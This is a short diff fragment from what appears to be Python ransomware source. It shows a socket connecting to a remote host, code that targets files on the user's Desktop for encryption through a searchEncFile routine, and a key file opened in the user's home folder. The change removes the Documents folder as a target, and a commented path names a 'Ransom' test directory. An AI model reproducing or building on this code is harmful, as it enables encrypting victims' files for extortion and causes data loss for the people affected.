@@ -124,13 +124,10 @@ sock.connect((RHOST, RPORT))
 
 user = os.getenv("USERNAME")
 startPath = 'C:\\Users\\' + user + '\\Desktop\\*'
-documentPath = 'C:\\Users\\' + user + '\\Documents\\*'
-#startPath = 'C:\\Users\\Yeeun\\Desktop\\Ransom_Private\\Ransom\\test\\*'
 keyPath = 'C:\\Users\\' + user + '\\'
 print(glob.glob(startPath, recursive=True))
 
 searchEncFile(startPath)
-searchEncFile(documentPath)
 
 kk = open(keyPath + 'key.txt', 'rb+')
 
